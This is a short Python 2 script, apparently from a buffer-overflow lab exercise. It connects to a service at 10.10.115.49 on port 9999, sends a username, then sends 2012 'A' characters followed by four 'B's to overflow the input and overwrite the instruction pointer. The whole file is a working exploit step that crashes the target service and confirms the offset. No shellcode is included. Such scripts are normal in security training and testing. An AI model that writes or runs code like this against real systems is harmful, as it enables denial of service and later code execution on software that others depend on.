#!/usr/bin/python

import socket,sys

address = "10.10.115.49"
port = 9999
buffer = "A"*2012+"B"*4

try:
	print "[+] Sending buffer"
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)
	s.send("User" + '\r\n')
	s.recv(1024)
	s.send(buffer + '\r\n')
except:
 	print "[!] Unable to connect to the application."
 	sys.exit(0)
finally:
	s.close()